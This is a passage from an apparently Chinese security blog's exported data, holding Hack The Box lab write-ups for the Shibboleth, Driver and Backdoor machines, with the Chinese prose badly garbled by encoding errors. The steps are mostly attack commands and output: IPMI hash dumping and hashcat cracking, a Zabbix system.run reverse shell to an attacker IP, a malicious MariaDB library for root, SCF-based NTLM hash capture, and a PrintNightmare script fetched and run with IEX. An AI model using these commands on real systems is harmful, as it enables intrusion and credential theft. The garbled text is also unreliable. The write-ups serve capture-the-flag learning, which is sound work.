ç¡®å®šäº†ç‰ˆæœ¬ï¼Œç„¶åå’±ä»¬å»æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰åˆ©ç”¨æ¨¡å— è¿™é‡Œæœ‰ä¸€ä¸ªhashdumpçš„è„šæœ¬ï¼Œä¼¼ä¹å¯ä»¥å¯¼å‡ºhashï¼Œå’±ä»¬è¯•è¯• msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 623 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.10.11.124 rhosts =&gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; exploit [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªè´¦æˆ·çš„hashï¼Œå’±ä»¬ä½¿ç”¨hashcatçˆ†ç ´hash â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================= * Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 1417/1481 MB (512 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 65 MB Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6:ilovepumkinpie1 Session..........: hashcat Status...........: Cracked Hash.Name........: IPMI2 RAKP HMAC-SHA1 Hash.Target......: 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52...27dcd6 Time.Started.....: Thu Dec 2 21:26:57 2021 (5 secs) Time.Estimated...: Thu Dec 2 21:27:02 2021 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1534.7 kH/s (1.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 7397376/14344385 (51.57%) Rejected.........: 0/7397376 (0.00%) Restore.Point....: 7393280/14344385 (51.54%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: iloverobert!!! -&gt; ilovemymum64. Started: Thu Dec 2 21:26:38 2021 Stopped: Thu Dec 2 21:27:03 2021 æˆåŠŸçˆ†ç ´å‡ºhashï¼Œç¡®å®šäº†è´¦å·å¯†ç  Username = Administrator Password = ilovepumkinpie1 æ‹¿ç€è´¦å·å¯†ç å»ç™»å½•åå°è¯•è¯• æˆåŠŸç™»å½•åå° ç»è¿‡æµ‹è¯• åœ¨Configgurationçš„Hostsé‡Œç‚¹å‡»Itemsï¼Œç„¶åè¿›å»æ·»åŠ æ–°é¡¹ç›®çš„çš„Keyå¤„ï¼Œä¹Ÿå¯ä»¥Getshell æœ‰ä¸¤ç¯‡Zabbixçš„ç›¸å…³æ–‡ç« å¤§å®¶å¯ä»¥çœ‹ä¸€ä¸‹ https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent https://sbcode.net/zabbix/agent-execute-python/ system.run[/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.19/4444 0&gt;&amp;1&quot;,nowait] è¿™è¾¹éœ€è¦ä½¿ç”¨system.runæ¥è¿›è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œä¸Šé¢å°±æ˜¯æˆ‘ä»¬çš„exploit é¦–å…ˆä½¿ç”¨ncè¿›è¡Œä¸€ä¸ªç«¯å£ç›‘å¬ nc -nvlp 4444 ç„¶ååœ¨ç½‘é¡µä¸­çš„Keyå¤„è¾“å…¥æˆ‘ä»¬çš„Exploitï¼Œç„¶åä¿å­˜å°±å¯ä»¥äº† ç„¶åç‚¹å‡»æœ€ä¸‹é¢çš„ä¿å­˜ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„Exploit â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 54322 sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; zabbix@shibboleth:/$ whoami&amp;&amp;id whoami&amp;&amp;id zabbix uid=110(zabbix) gid=118(zabbix) groups=118(zabbix) æˆåŠŸè·å¾—ä¸€ä¸ªshell æƒé™æå‡Useræƒé™zabbix@shibboleth:/$ cat /etc/passwd | grep bash cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æœ‰bashæƒé™çš„è´¦æˆ·ï¼Œæœ‰ä¸€ä¸ªipmi-svcï¼Œçœ‹æ¥å’±ä»¬å¿…é¡»å¾—ææƒåˆ°å®ƒ æˆ‘ä»¬éœ€è¦ç™»å½•åˆ°ipmi-svcè´¦æˆ·ï¼Œå¯†ç ä¸ç½‘ç«™åå°å¯†ç æ˜¯ä¸€æ ·çš„ zabbix@shibboleth:/etc/zabbix$ su ipmi-svc su ipmi-svc Password: ilovepumkinpie1 ipmi-svc@shibboleth:/etc/zabbix$ whoami&amp;&amp;id whoami&amp;&amp;id ipmi-svc uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc) ipmi-svc@shibboleth:/tmp$ cd cd ipmi-svc@shibboleth:~$ ls ls user.txt ipmi-svc@shibboleth:~$ cat user.txt cat user.txt b6611bf946f56dc23bcfc3e77f150204 æˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶ rootæƒé™åœ¨zabbixæœåŠ¡å™¨ä¸‹æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶å¯†ç  ipmi-svc@shibboleth:/etc/zabbix$ grep -iR &#39;password&#39; /etc/zabbix/ 2&gt;/dev/null grep -iR &#39;password&#39; /etc/zabbix/ 2&gt;/dev/null /etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword /etc/zabbix/zabbix_server.conf.dpkg-dist:# Database password. /etc/zabbix/zabbix_server.conf.dpkg-dist:# Comment this line if no password is used. /etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword= /etc/zabbix/zabbix_server.conf:### Option: DBPassword /etc/zabbix/zabbix_server.conf:# Database password. /etc/zabbix/zabbix_server.conf:# Comment this line if no password is used. /etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh ç„¶åç™»å½•mysqlæœåŠ¡ ipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -p -D zabbix mysql -u zabbix -p -D zabbix Enter password: bloooarskybluh Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2954 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. å°†10.3.25-MariaDBè¯¥ç‰ˆæœ¬æ‹¿å»Googleä¸€ä¸‹ https://github.com/Al1ex/CVE-2021-27928 æ‰¾åˆ°äº†ä¸€ä¸ªCVE è¯¥Exploitå¤§æ¦‚åˆ†ä¸ºå‡ æ­¥ Step 1ï¼š ä½¿ç”¨Msfç”Ÿæˆä¸€ä¸ª.soçš„æœ¨é©¬ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 -f elf-so -o Exploit.so Step 2ï¼š ä½¿ç”¨NCç›‘å¬ä¸€ä¸ªç«¯å£ Nc -nvlp 5555 Step 3ï¼š å°†Exploitä¸Šä¼ åˆ°é¶æœºçš„/tmpç›®å½•ä¸‹ æœ¬åœ°æœºå™¨ï¼šPython3å¼€å§‹ä¸€ä¸ªHttpæœåŠ¡ python3 -m http.server 80 é¶æœºï¼šä¸‹è½½Exploitå¹¶ä¿å­˜åˆ°/tmpç›®å½•ä¸‹ cd /tmp wget http://10.10.14.19/Exploit.so Step 4ï¼š ç™»å½•mysqlåæ‰§è¡Œè„šæœ¬ SET GLOBAL wsrep_provider=&quot;/tmp/Exploit.so&quot;; â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 38044 python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; root@shibboleth:/var/lib/mysql# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸè·å¾—rootæƒé™ root@shibboleth:/var/lib/mysql# cd /root cd /root root@shibboleth:/root# ls ls root.txt scripts root@shibboleth:/root# cat root.txt cat root.txt f99dbe4d5d33fc228cb8eaaf5cf0d2ac æˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Driver - Hackthebox","slug":"Hackthebox - Driver","date":"2021-11-26T11:38:36.000Z","updated":"2023-05-20T01:36:14.000Z","comments":true,"path":"2021/11/26/Hackthebox - Driver/","link":"","permalink":"http://www.lucifiel.com/2021/11/26/Hackthebox%20-%20Driver/","excerpt":"","text":"Hackthebox - Driveré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.106 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 09:33 EDT Nmap scan report for 10.10.11.106 Host is up (0.28s latency). Not shown: 65531 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|specialized|phone Running (JUST GUESSING): Microsoft Windows 2008|Vista|7|8.1|Phone (90%), FreeBSD 6.X (85%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:freebsd:freebsd:6.2 Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows 7 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (86%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (86%), Microsoft Windows 7 Professional or Windows 8 (86%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-10-12T20:34:34 |_ start_date: 2021-10-12T11:55:48 TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 274.83 ms 10.10.14.1 2 274.88 ms 10.10.11.106 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.40 secon è®¿é—®80ç«¯å£æç¤ºéœ€è¦ç™»å½•ï¼Œéšä¾¿æµ‹ä¸ª0 day(admin/admin)å§ 0 dayçœŸå¥½ç”¨ï¼Œç›´æ¥å°±è¿›æ¥äº† åœ¨Firmware Updateså¤„æœ‰ä¸ªä¸Šä¼ ç‚¹ï¼Œè¯´ä¸å®šæ˜¯çªç ´å£ å°è¯•äº†ä¸€ä¸‹ä¸Šä¼ ï¼Œä½†ä¼¼ä¹æ˜¯å¤±è´¥äº†ï¼Œè¿˜å¾—æ‰¾å…¶ä»–æ€è·¯æ¥çªç ´ å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨smbä¸Šï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œå…¶ä¸­çš„é€šè¿‡NTLMæ•è·è¿›è¡Œæ”»å‡»æˆ‘è§‰å¾—æŒºä¸é”™çš„ https://www.hackingarticles.in/smb-penetration-testing-port-445/ https://sql--injection.blogspot.com/p/smb.html æ¼æ´åˆ©ç”¨é¦–å…ˆåˆ›å»ºä¸€ä¸ªshell.scfæ–‡ä»¶ [Shell] Command=2 IconFile=\\\\10.10.14.18\\share\\test.ico [Taskbar] Command=ToggleDesktop ç„¶åä½¿ç”¨responderç›‘å¬å’±ä»¬è¿æ¥htbçš„é‚£ä¸ªç½‘å¡ responder -wrf --lm -v -I tun0 ç„¶åå»ä¹‹å‰æ‰¾åˆ°çš„ä¸Šä¼ ç‚¹ä¸Šä¼ æˆ‘ä»¬çš„shell.scfæ–‡ä»¶ [SMB] NTLMv2 Client : 10.10.11.106 [SMB] NTLMv2 Username : DRIVER\\tony [SMB] NTLMv2 Hash : tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 ç„¶åresponderç›‘å¬çš„ç½‘å¡ä¼šæ•è·åˆ°è´¦æˆ·å’Œhash æˆ‘ä»¬æ‹¿å»åˆ°hashcaté‡Œè¿›è¡Œè§£æ æŒ‡ä»¤ï¼šhashcat -m 5600 tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 /usr/share/wordlists/rockyou.txt --force ç»“æœï¼šTONY::DRIVER:4621242103dad095:83bfcb019542f3819bc7e01483163418:0101000000000000758c41c3a6e2d701fdd24c3ff72cbc5100000000020000000000000000000000:liltony è´¦å·ï¼štony å¯†ç ï¼šliltony ä½¿ç”¨evil-winrmè¿›è¡Œç™»å½• å®‰è£…evil-winrmï¼šgem install evil-winrm â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# evil-winrm -i 10.10.11.106 -u tony -p liltony Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; whoami driver\\tony *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; ls *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\tony&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; ls Directory: C:\\Users\\tony\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 11/25/2021 6:07 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; cat user.txt 459008f0f8600767fe59f9602714aa04 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag æƒé™æå‡get-process ä½¿ç”¨è¯¥å‘½ä»¤è·å–é¶æœºçš„è¿›ç¨‹ï¼Œåœ¨è¿›ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ä¸€æ¡ 379 22 5140 13908 ...12 1228 spoolsv åœ¨è¿›ç¨‹ä¸­å‘ç°spoolsvåœ¨è¿è¡Œï¼Œçªç ´å£å°±åœ¨è¿™äº† ä½¿ç”¨æ¼æ´CVE-2021-1675å³å¯ææƒ https://github.com/calebstewart/CVE-2021-1675 åœ¨æœ¬åœ°ä½¿ç”¨python3æ¶è®¾ä¸€ä¸ªhttpæœåŠ¡å™¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ç„¶åè¿œç¨‹åŠ è½½æˆ‘ä»¬çš„è„šæœ¬ IEX(New-Object Net.WebClient).DownloadString(&quot;http://10.10.14.18/CVE-2021-1675.ps1&quot;) ä½¿ç”¨è„šæœ¬æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ· *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; Invoke-Nightmare -DriverName &quot;DRIVER&quot; -NewUser &quot;lucifiel&quot; -NewPassword &quot;lucifiel123&quot; [+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = &quot;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll&quot; [+] added user lucifiel as local administrator [+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator DefaultAccount Guest lucifiel tony The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; runas /user:lucifiel powershell.exe Enter the password for lucifiel: *Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator lucifiel The command completed successfully. ç¡®è®¤æƒé™ç»„æ²¡é—®é¢˜ ä½¿ç”¨æ–°åˆ›å»ºçš„è´¦æˆ·è¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# evil-winrm -i 10.10.11.106 -u lucifiel -p lucifiel123 Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\lucifiel\\Documents&gt; whoami driver\\lucifiel *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 11/26/2021 4:54 AM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt 548e6653f57567449ffce29432eaa8c3 æˆåŠŸå¾—åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Backdoor - Hackthebox","slug":"Hackthebox - Backdoor","date":"2021-11-24T11:38:36.000Z","updated":"2023-05-20T01:19:08.000Z","comments":true,"path":"2021/11/24/Hackthebox - Backdoor/","link":"","permalink":"http://www.lucifiel.com/2021/11/24/Hackthebox%20-%20Backdoor/","excerpt":"","text":"Hackthebox - Backdooré¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 20:41 EST Nmap scan report for 10.10.11.125 Host is up (0.39s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: WordPress 5.8.1 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Backdoor â€“ Real-Life 1337/tcp open waste? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=11/21%OT=22%CT=1%CU=33566%PV=Y%DS=2%DC=T%G=Y%TM=619AF5 OS:A4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=FB%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3 OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 587/tcp) HOP RTT ADDRESS 1 492.34 ms loaclhost (10.10.14.1) 2 492.34 ms 10.10.11.125 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.37 seconds ä»ä¸Šå¯ä»¥çœ‹åˆ°è¯¥å°é¶æœºä½¿ç”¨äº†WordPress 5.8.1 CMSä½œä¸ºæœåŠ¡æ­å»ºï¼Œå’±ä»¬å»wpscanä¸€ä¸‹ï¼Œé¡ºä¾¿æœç´¢çœ‹çœ‹æ˜¯å¦æœ‰æ¼æ´ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.11.125/ [10.10.11.125] [+] Started: Sun Nov 21 20:55:16 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.11.125/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09). | Found By: Rss Generator (Passive Detection) | - http://10.10.11.125/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt; | - http://10.10.11.125/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt; [+] WordPress theme in use: twentyseventeen | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/ | Latest Version: 2.8 (up to date) | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.8 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;Version: 2.8&#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:30 &lt;====================================================================================================================================&gt; (358 / 358) 100.00% Time: 00:00:30 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:04:14 &lt;==================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:04:14 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:03 &lt;======================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:03 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Nov 21 21:00:23 2021 [+] Requests Done: 2976 [+] Cached Requests: 18 [+] Data Sent: 836.808 KB [+] Data Received: 721.12 KB [+] Memory used: 297.57 MB [+] Elapsed time: 00:05:07 